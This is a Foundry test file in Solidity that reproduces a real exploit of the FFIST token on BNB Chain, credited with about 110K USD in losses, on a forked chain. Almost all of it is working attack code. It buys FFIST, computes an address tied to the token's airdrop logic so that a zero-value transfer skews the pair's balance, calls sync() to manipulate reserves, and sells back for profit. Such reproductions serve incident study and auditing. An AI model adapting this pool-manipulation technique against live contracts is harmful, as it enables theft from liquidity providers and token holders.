// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~110K USD$
// Attacker : https://bscscan.com/address/0xcc8617331849962c27f91859578dc91922f6f050
// Attack Contract : https://bscscan.com/address/0xb31c7b7bdf69554345e47a4393f53c332255c9fb
// Vulnerable Contract : https://bscscan.com/address/0x80121da952a74c06adc1d7f85a237089b57af347
// Attack Tx : https://bscscan.com/tx/0x199c4b88cab6b4b495b9d91af98e746811dd8f82f43117c48205e6332db9f0e0

// @Info
// Vulnerable Contract Code : https://bscscan.com/address/0x80121da952a74c06adc1d7f85a237089b57af347#code

// @Analysis
// Twitter Guy : https://twitter.com/Phalcon_xyz/status/1681869807698984961
// Twitter Guy : https://twitter.com/AnciliaInc/status/1681901107940065280

interface IairdropToken is IERC20 {
    function lastAirdropAddress() external view returns (address);
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IairdropToken FFIST = IairdropToken(0x80121DA952A74c06adc1d7f85A237089b57AF347);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    address Pair = 0x7a3Adf2F6B239E64dAB1738c695Cf48155b6e152;
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);

    function setUp() public {
        vm.createSelectFork("bsc", 30_113_117);
        vm.label(address(WBNB), "WBNB");
        vm.label(address(FFIST), "FFIST");
        vm.label(address(USDT), "USDT");
        vm.label(address(Router), "Router");
    }

    function testExploit() external {
        deal(address(WBNB), address(this), 0.01 ether);
        WBNB.approve(address(Router), type(uint256).max);
        FFIST.approve(address(Router), type(uint256).max);
        WBNBToFFIST();
        pairReserveManipulation();
        FFISTToWBNB();

        emit log_named_decimal_uint(
            "Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), WBNB.decimals()
        );
    }

    function pairReserveManipulation() internal {
        address to = address(
            uint160(address(this)) ^ (uint160(FFIST.lastAirdropAddress()) | uint160(block.number)) ^ uint160(Pair)
        );
        FFIST.transfer(to, 0);
        Uni_Pair_V2(Pair).sync();
    }

    function WBNBToFFIST() internal {
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(FFIST);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }

    function FFISTToWBNB() internal {
        address[] memory path = new address[](3);
        path[0] = address(FFIST);
        path[1] = address(USDT);
        path[2] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            FFIST.balanceOf(address(this)), 0, path, address(this), block.timestamp
        );
    }
}
